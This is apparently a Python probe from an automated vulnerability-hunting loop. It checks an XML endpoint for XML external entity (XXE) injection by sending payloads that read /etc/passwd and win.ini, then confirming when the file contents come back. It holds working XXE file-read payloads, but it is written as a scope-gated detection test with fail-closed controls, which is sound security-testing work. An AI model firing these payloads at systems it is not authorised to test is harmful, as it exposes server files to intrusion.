#!/usr/bin/env python3
"""Generic XML external entity (XXE) probe for an UNKNOWN xml sink.

Rule #70: the one loop hunts targets it has never seen — this probe
takes the sink spec from its marker argv (the loop encodes it there so
_probe_cmd needs no changes):

    MARKER = PLOOP70|<target_base>|<path>|POST|

An XXE claim needs the TARGET's server to RESOLVE an external entity
inside an application/xml POST body. The probe proves this through a
FILE-READ channel: it sends an XML document defining an external
entity pointing at a well-known local file, and CONFIRMs only when
the file's CONTENT MARKER — which was never transmitted — appears in
the response body. Ladder:

  file:///etc/passwd          -> marker "root:x:0:0"      (via=xxe-file-read)
  file:///c:/windows/win.ini  -> marker "[fonts]"         (via=xxe-file-read)

The probe NEVER transmits "root:x:0:0" or "[fonts]" — only a server
that resolved the entity and read its own file can explain their
presence in the response.

CONFIRM only when a content marker is present. A verbatim echo of the
entity reference ("&xxe70;" visible, marker absent) is reflection ->
FAILED (the hard negative control). If the BENIGN baseline already
contains a marker (a static page quoting it), the probe fails closed —
a claim must never rest on content the app serves to everyone.

Fail-closed rules (the probe lesson, 29 Oct):
  - The control request can never confirm (benign XML, no entities).
  - Marker present in the benign baseline -> VERDICT: FAILED.
  - Entity reference echoed without the file content -> FAILED
    (reflection, not resolution).
  - Errors, timeouts, empty bodies -> FAILED.
  - No marker in any payload response -> VERDICT: FAILED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED. The
probe never fetches anything external; it only asks the TARGET for
URLs the loop's own scope gate already allowed.
"""
import http.client
import re
import sys
import time
import urllib.parse

REQ_TIMEOUT = 15
_BENIGN_XML = ('<?xml version="1.0"?><request>'
               '<note>ploop70-benign</note></request>')
# File-read ladder: (doctype payload, content marker, via). The marker
# is NEVER transmitted — only entity resolution on the target's own
# filesystem can explain it in the response.
_PAYLOADS = [
    ('<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY xxe70 SYSTEM "file:///etc/passwd">]>'
     '<r>&xxe70;</r>',
     "root:x:0:0", "xxe-file-read"),
    ('<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY xxe70 SYSTEM "file:///c:/windows/win.ini">]>'
     '<r>&xxe70;</r>',
     "[fonts]", "xxe-file-read"),
]


def _post(tb, path, xml_body):
    """POST application/xml without following redirects.
    Returns (code, body)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    data = xml_body.encode("utf-8")
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=REQ_TIMEOUT)
    try:
        conn.request("POST", pu.path, body=data,
                     headers={"User-Agent": "PLOOP70",
                              "Host": pu.netloc,
                              "Content-Type": "application/xml",
                              "Content-Length": str(len(data))})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body
    finally:
        conn.close()


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP70"
    try:
        _, tb_q, path_q, method, _params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "POST").upper()
    if not tb or not path.startswith("/") or method != "POST":
        print("PROBE_ERROR invalid sink spec "
              "(XXE needs a POST xml sink)")
        print("VERDICT: FAILED")
        return
    print("EVIDENCE sink=%s marker=%s" % (path, marker))
    # 1. Control: benign XML must answer.
    try:
        _code, base_body = _post(tb, path, _BENIGN_XML)
    except Exception as exc:
        print("PROBE_ERROR control errored: %s" % exc)
        print("VERDICT: FAILED")
        return
    if not base_body:
        print("PROBE_ERROR control empty body (fail-closed)")
        print("VERDICT: FAILED")
        return
    # Fail closed when the app serves a content marker to everyone: a
    # claim could then never distinguish real entity resolution.
    for _payload, content_marker, _via in _PAYLOADS:
        if content_marker in base_body:
            print("PROBE_ERROR fail-closed: %r present in the benign "
                  "baseline" % content_marker)
            print("VERDICT: FAILED")
            return
    # 2. File-read ladder.
    for payload, content_marker, via in _PAYLOADS:
        try:
            _code, body = _post(tb, path, payload)
        except Exception:
            continue  # one dead payload never aborts the ladder
        if content_marker in body:
            print("EVIDENCE sink=%s channel=file-read via=%s"
                  % (path, via))
            print("detail: response body contains the file content "
                  "marker %r, which was never transmitted (external "
                  "entity resolved server-side)" % content_marker)
            print("VERDICT: CONFIRMED")
            return
        # A verbatim echo of the entity reference without the file
        # content is reflection, not resolution — note it and keep
        # climbing (it can never confirm).
        if "&xxe70;" in body or "xxe70" in body:
            print("note: entity reference reflected without file "
                  "content (reflection, not resolution)")
    print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
